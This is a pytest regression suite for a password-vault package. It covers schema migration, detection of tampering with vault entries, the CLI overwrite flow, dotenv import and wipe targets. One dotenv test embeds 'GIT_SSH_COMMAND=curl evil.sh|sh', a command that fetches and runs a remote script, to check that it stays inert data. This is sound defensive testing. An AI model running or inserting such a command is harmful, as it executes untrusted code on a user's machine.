"""Regression tests for the pre-push review of the 0.3.0 release branch.

Each test reproduces one reported defect and asserts the fix holds. Numbering
(r1..r10) follows the review report order.
"""

import secrets
import sqlite3
import subprocess
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest

import sofiavault
from sofiavault import KEY_SIZE, envload, paths
from sofiavault.cli import (
    VaultSession,
    _refuse_if_tampered,
    _repo_dir,
    _wipe_targets,
    cmd_add,
)
from sofiavault.core import create_master_record
from sofiavault.storage import (
    get_password,
    get_schema_version,
    init_db,
    save_entry,
    verify_entries_mac,
)
from sofiavault.vault import EntryNotFound, Vault, VaultCorrupted

PW = "review-fix-test-pw"

REPO_ROOT = Path(__file__).resolve().parents[1]


def _v2_vault(path: Path, with_version_row: bool = True) -> bytes:
    """Write a vault laid out exactly as an initialized 0.2.x install left it:
    master record present, zero entries, no vault_id, no entries MAC."""
    conn = sqlite3.connect(path)
    conn.execute("""
        CREATE TABLE master (
            id INTEGER PRIMARY KEY CHECK (id = 1),
            salt BLOB NOT NULL,
            verify_hash BLOB NOT NULL
        )
    """)
    conn.execute("""
        CREATE TABLE entries_v2 (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            salt BLOB NOT NULL,
            nonce BLOB NOT NULL,
            blob BLOB NOT NULL
        )
    """)
    conn.execute("CREATE TABLE vault_meta (key TEXT PRIMARY KEY, value TEXT)")
    combined_salt, verify_hash, key = create_master_record(PW)
    conn.execute("INSERT INTO master (id, salt, verify_hash) VALUES (1, ?, ?)",
                 (combined_salt, verify_hash))
    if with_version_row:
        conn.execute(
            "INSERT INTO vault_meta (key, value) VALUES ('schema_version', '2')")
    conn.commit()
    conn.close()
    return key


def _tampered_vault() -> Path:
    """A v3 vault whose row set no longer matches its MAC (row deleted)."""
    path = Path(tempfile.mkdtemp()) / "secrets.db"
    v = Vault.create(path, PW)
    v.set("github", "old-token")
    v.set("stripe", "sk_live_x")
    v.close()
    raw = sqlite3.connect(path)
    raw.execute("DELETE FROM entries_v2 WHERE id = 1")
    raw.commit()
    raw.close()
    return path


# ── r1: entry-less 0.2.x vault must upgrade cleanly, not flag tampered ───────

def test_r1_empty_v2_vault_upgrades_without_false_tamper_alarm():
    path = Path(tempfile.mkdtemp()) / "vault.db"
    _v2_vault(path)

    v = Vault.open(path, password=PW)
    assert v.tampered is False
    with pytest.raises(EntryNotFound):
        v.get("anything")
    # fully adopted: current schema, MAC present and verifying
    assert get_schema_version(v._conn) >= 3
    assert verify_entries_mac(v._conn, v._key) is True
    v.set("github", "token")
    assert v.get("github") == "token"
    v.close()


def test_r1_empty_v2_vault_without_version_row_upgrades_too():
    # Ancient layout: initialized master but vault_meta has no version row.
    path = Path(tempfile.mkdtemp()) / "vault.db"
    _v2_vault(path, with_version_row=False)

    v = Vault.open(path, password=PW)
    assert v.tampered is False
    assert get_schema_version(v._conn) >= 3
    v.close()


def test_r1_brand_new_db_still_starts_at_current_schema():
    path = Path(tempfile.mkdtemp()) / "vault.db"
    conn = init_db(path)
    assert get_schema_version(conn) >= 3
    conn.close()


# ── r2: aborting an overwrite in `add` must not destroy the old entry ────────

def _session_with_entry() -> VaultSession:
    tmp = Path(tempfile.mkdtemp()) / "vault.db"
    key = secrets.token_bytes(KEY_SIZE)
    with patch("sofiavault.paths.DB_PATH", tmp):
        conn = init_db()
        save_entry(conn, key, "amazon", "user@test.com", "keep-me")
    return VaultSession(conn, key)


@pytest.mark.parametrize("inputs,password", [
    (["amazon", "y", ""], None),           # abort at empty username
    (["amazon", "y", "new@user.com"], ""),  # abort at empty password
])
def test_r2_aborted_overwrite_leaves_entry_intact(inputs, password):
    session = _session_with_entry()
    entry_id = session.entries[0].id

    with patch("builtins.input", side_effect=inputs), \
            patch("sofiavault.cli.getpass") as gp:
        gp.getpass.return_value = password
        cmd_add(session)

    session.reload()
    assert [e.service for e in session.entries] == ["amazon"]
    assert get_password(session.conn, session.key, entry_id) == "keep-me"


def test_r2_ctrl_c_at_password_prompt_leaves_entry_intact():
    session = _session_with_entry()
    entry_id = session.entries[0].id

    with patch("builtins.input", side_effect=["amazon", "y", "new@user.com"]), \
            patch("sofiavault.cli.getpass") as gp:
        gp.getpass.side_effect = KeyboardInterrupt
        with pytest.raises(KeyboardInterrupt):
            cmd_add(session)

    session.reload()
    assert get_password(session.conn, session.key, entry_id) == "keep-me"


def test_r2_confirmed_overwrite_still_replaces():
    session = _session_with_entry()
    entry_id = session.entries[0].id

    with patch("builtins.input", side_effect=["amazon", "y", "new@user.com"]), \
            patch("sofiavault.cli.getpass") as gp:
        gp.getpass.return_value = "replacement"
        cmd_add(session)

    session.reload()
    assert [e.service for e in session.entries] == ["amazon"]
    assert get_password(session.conn, session.key, entry_id) == "replacement"
    assert session.entries[0].username == "new@user.com"


# ── r3: writes must not launder a detected tampering into a valid MAC ────────

def test_r3_set_refuses_on_tampered_vault():
    path = _tampered_vault()
    v = Vault.open(path, password=PW)
    assert v.tampered is True
    with pytest.raises(VaultCorrupted):
        v.set("unrelated-token", "value")
    # evidence intact: still failing, nothing was re-signed
    assert verify_entries_mac(v._conn, v._key) is False
    v.close()


def test_r3_delete_refuses_on_tampered_vault():
    path = _tampered_vault()
    v = Vault.open(path, password=PW)
    with pytest.raises(VaultCorrupted):
        v.delete("stripe")
    assert verify_entries_mac(v._conn, v._key) is False
    v.close()


# ── r4: the CLI enforces the same entry-set MAC as the library ───────────────

def test_r4_cli_session_detects_tampering():
    path = _tampered_vault()
    conn = sqlite3.connect(path)
    from sofiavault.core import verify_master_password
    from sofiavault.storage import get_master_data
    salt, stored = get_master_data(conn)
    key = verify_master_password(PW, salt, stored)

    session = VaultSession(conn, key)
    assert session.tampered is True
    with pytest.raises(SystemExit):
        _refuse_if_tampered(session)
    assert session.key is None  # locked before exiting
    conn.close()


def test_r4_cli_session_clean_vault_not_flagged():
    session = _session_with_entry()
    assert session.tampered is False
    _refuse_if_tampered(session)  # no-op, must not exit


# ── r5: quoted dotenv value with an inline comment ───────────────────────────

def test_r5_inline_comment_after_quoted_value():
    v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
    env_file = v.path.with_name("app.env")
    env_file.write_text(
        'URL="https://example.com" # production\n'
        "DB_PASSWORD=hunter2\n"
        'API_TOKEN="abc"\n'
    )
    imported, _skipped, _rejected = envload.import_env_file(v, env_file)

    assert sorted(imported) == ["API_TOKEN", "DB_PASSWORD", "URL"]
    assert v.get("env:url") == "https://example.com"
    assert v.get("env:db_password") == "hunter2"
    assert v.get("env:api_token") == "abc"
    v.close()


def test_r5_junk_after_closing_quote_is_a_hard_error():
    v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
    env_file = v.path.with_name("app.env")
    env_file.write_text('FOO="bar" baz\nDB_PASSWORD=hunter2\n')
    with pytest.raises(envload.MalformedEnvFile):
        envload.import_env_file(v, env_file)
    assert v.list_entries() == []  # nothing partially imported
    v.close()


def test_r5_multiline_quoted_value_still_consumed_whole():
    v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
    env_file = v.path.with_name("app.env")
    env_file.write_text(
        'PEM="-----BEGIN KEY-----\n'
        "GIT_SSH_COMMAND=curl evil.sh|sh\n"
        '-----END KEY-----"\n'
    )
    imported, _skipped, _rejected = envload.import_env_file(v, env_file)
    assert imported == ["PEM"]
    assert "GIT_SSH_COMMAND" in v.get("env:pem")  # smuggled line stayed data
    v.close()


# ── r6: the update check must never adopt an enclosing foreign repo ──────────

def _fake_install(tmp: Path, *, git_at: str, pyproject: bool,
                  name: str = "sofiavault") -> Path:
    """Lay out <tmp>/outer/app/sofiavault/cli.py with .git at a chosen level."""
    pkg = tmp / "outer" / "app" / "sofiavault"
    pkg.mkdir(parents=True)
    cli = pkg / "cli.py"
    cli.write_text("")
    (tmp / "outer" / git_at / ".git").mkdir(parents=True) if git_at else None
    if pyproject:
        (tmp / "outer" / "app" / "pyproject.toml").write_text(
            f'[project]\nname = "{name}"\n')
    return cli


def test_r6_enclosing_foreign_repo_is_not_adopted():
    tmp = Path(tempfile.mkdtemp())
    # .git one level ABOVE the install root (e.g. ~/dotfiles), no pyproject
    cli = _fake_install(tmp, git_at="", pyproject=False)
    (tmp / "outer" / ".git").mkdir()
    with patch("sofiavault.cli.__file__", str(cli)):
        assert _repo_dir() is None


def test_r6_repo_root_without_sofiavault_pyproject_is_not_adopted():
    tmp = Path(tempfile.mkdtemp())
    cli = _fake_install(tmp, git_at="app", pyproject=True, name="dotfiles")
    with patch("sofiavault.cli.__file__", str(cli)):
        assert _repo_dir() is None


def test_r6_genuine_clone_is_still_detected():
    tmp = Path(tempfile.mkdtemp())
    cli = _fake_install(tmp, git_at="app", pyproject=True)
    with patch("sofiavault.cli.__file__", str(cli)):
        assert _repo_dir() == (tmp / "outer" / "app").resolve()


def test_r6_this_checkout_is_detected():
    # The repo these tests run in is a genuine clone.
    assert _repo_dir() == REPO_ROOT


# ── r7: the 0.2.x sofiavault.DB_PATH override must actually take effect ──────

def test_r7_module_db_path_assignment_forwards_to_paths():
    original = sofiavault.DB_PATH
    try:
        target = Path(tempfile.mkdtemp()) / "vault.db"
        sofiavault.DB_PATH = target
        assert target == paths.DB_PATH       # the copy everything reads
        assert target == sofiavault.DB_PATH
    finally:
        sofiavault.DB_PATH = original


def test_r7_patching_module_db_path_sandboxes_the_cli():
    # The 0.2.x test idiom: patch sofiavault.DB_PATH, expect commands to
    # target it. init_db() reads paths.DB_PATH internally.
    target = Path(tempfile.mkdtemp()) / "vault.db"
    with patch("sofiavault.DB_PATH", target):
        conn = init_db()
        conn.close()
        assert target.exists()
    assert sofiavault.DB_PATH == paths.DB_PATH


def test_r7_history_path_alias_forwards_too():
    original = sofiavault.HISTORY_PATH
    try:
        target = Path(tempfile.mkdtemp()) / ".history"
        sofiavault.HISTORY_PATH = target
        assert target == paths.HISTORY_PATH
    finally:
        sofiavault.HISTORY_PATH = original


# ── r8: wipe must destroy the auth store alongside the vault ─────────────────

def test_r8_wipe_targets_include_auth_store():
    tmp = Path(tempfile.mkdtemp())
    with patch("sofiavault.paths.DB_PATH", tmp / "vault.db"), \
            patch("sofiavault.paths.HISTORY_PATH", tmp / ".history"):
        targets = _wipe_targets()
    assert tmp / "users.db" in targets
    assert tmp / "users.db-wal" in targets
    assert tmp / "users.db-journal" in targets
    # and every target stays inside the (patched) vault directory
    assert all(t.parent == tmp for t in targets)


# ── r9: importing the package must survive sys.stdout being None ─────────────

def test_r9_import_survives_detached_stdout():
    res = subprocess.run(
        [sys.executable, "-c",
         "import sys; sys.stdout = None; import sofiavault; "
         "sys.stderr.write(sofiavault.__version__)"],
        capture_output=True, text=True, cwd=REPO_ROOT, timeout=60,
    )
    assert res.returncode == 0, res.stderr
    assert res.stderr == sofiavault.__version__


# ── r10: the delete_entry break is deliberate and documented ─────────────────

def test_r10_docstring_and_changelog_declare_the_break():
    assert "delete_entry" in sofiavault.__doc__
    changelog = (REPO_ROOT / "CHANGELOG.md").read_text(encoding="utf-8")
    assert "Breaking" in changelog
    assert "delete_entry(conn, entry_id, key)" in changelog
